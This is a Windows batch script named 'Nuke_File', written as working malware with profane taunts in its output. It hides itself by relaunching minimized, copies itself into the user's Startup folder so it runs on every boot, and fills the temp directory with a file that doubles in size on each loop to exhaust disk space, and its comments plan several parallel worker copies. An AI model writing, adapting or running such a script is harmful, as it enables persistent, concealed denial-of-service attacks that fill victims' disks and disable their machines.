::--------------------------------------------------::

@ECHO OFF
@COLOR B
@TITLE Nuke_File v1.0.0

:: Note to self: Make it so the file checks what directory it is in
:: If it is not in the 'startup' directory, have it move itself to it
:: before closing or forcefully rebooting the system
:: This "should" prevent it from showing up in the taskbar on the
:: next startup of the system and better disguise the program

::--------------------------------------------------::

:: Checks if the current command prompt session is minimized or not
:: If it is, this continues with the rest of the script
:: If it is not, it starts a new instance that is and closes the current one
IF NOT DEFINED IS_MINIMIZED (
  SET IS_MINIMIZED=1
  START "" /MIN "%~dpnx0" %*
  EXIT
)

::--------------------------------------------------::

CD "%~dp0"
IF "%CD%"=="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
  DEL /Q "%IS_MOVED%\Nuke_File.bat"
  GOTO:START
) ELSE (
    SET IS_MOVED=%CD%
    COPY /Y "%CD%"\Nuke_File.bat "C:\Users\epcsc\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    START "" /MIN "C:\Users\epcsc\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Nuke_File.bat"
    EXIT
  )

::--------------------------------------------------::


::25 Loops will create a file 1GB in size
::37 Loops 'should' come out to 4TB, although this needs to be tested
:START
::Note to self - Make it so 4 other instances of this script are created, each with
::a number at the end 1 higher than the last. Make sure to change the name of the 'Get_Fucked_Shithead.temp'
::file to include these numbers at the end of themselves so each 'worker' creates its own .temp file
ECHO Get Fucked, Shithead


CD %TEMP%
ECHO "Get Fucked, Shithead" >> Get_Fucked_Shithead.temp
FOR /L %%b in (1,1,30) DO TYPE Get_Fucked_Shithead.temp >> Get_Fucked_Shithead.temp

::EXIT
::--------------------------------------------------::

::Deprecated

:: Checks if the 'counter' is set or not - If not, this command should set
:: the counter to a value of '1' and proceed to increase it for each command
:: window opened after this
::IF NOT DEFINED NUKE_COUNT SETX NUKE_COUNT 0
::ECHO %NUKE_COUNT%
::SETX NUKE_COUNT %NUKE_COUNT%+1
::ECHO %NUKE_COUNT%

:: Checks if a certain amount of command windows are running using a variable (WORKERS_SET)
:: If they are not all open, a loop command opens them after setting the variable
:: to a different value. This prevents the new windows from opening more clones
::IF NOT DEFINED WORKERS_SET SET WORKERS_SET=1 && FOR /L %%a in (1,1,4) DO START "" "%~dpnx0"

::ECHO "Get Fucked, Shithead" >> Get_Fucked_Shithead_%NUKE_COUNT%.txt
::FOR /L %%b in (1,1,25) DO TYPE Get_Fucked_Shithead_%NUKE_COUNT%.txt >> Get_Fucked_Shithead_%NUKE_COUNT%.txt
